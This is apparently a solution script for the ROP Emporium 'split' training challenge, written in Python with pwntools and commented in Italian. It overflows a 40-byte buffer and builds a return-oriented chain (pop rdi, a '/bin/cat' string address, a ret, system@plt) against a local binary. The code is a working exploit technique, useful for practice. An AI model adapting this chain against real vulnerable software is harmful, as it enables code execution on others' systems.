#!/usr/bin/env python3
from pwn import *
##SPLIT64
offset = 40
bin_cat = 0x00601060        # dall'output rabin2
pop_rdi_ret = 0x004007c3      # pop rdi; ret;
ret_simple = 0x40053e       # semplice `ret`
system_plt = 0x00400560       # system@plt


payload = b'A'*offset + p64(pop_rdi_ret) + p64(bin_cat) + p64(ret_simple) + p64(system_plt)


p = process("./split")
p.sendline(payload)
print(p.recvall(timeout=2).decode(errors='ignore'))
# se crasha -> prova con ret_simple prima di system:
# payload = b'A'*offset + p64(pop_rdi_ret) + p64(bin_cat) + p64(ret_simple) + p64(system_plt)
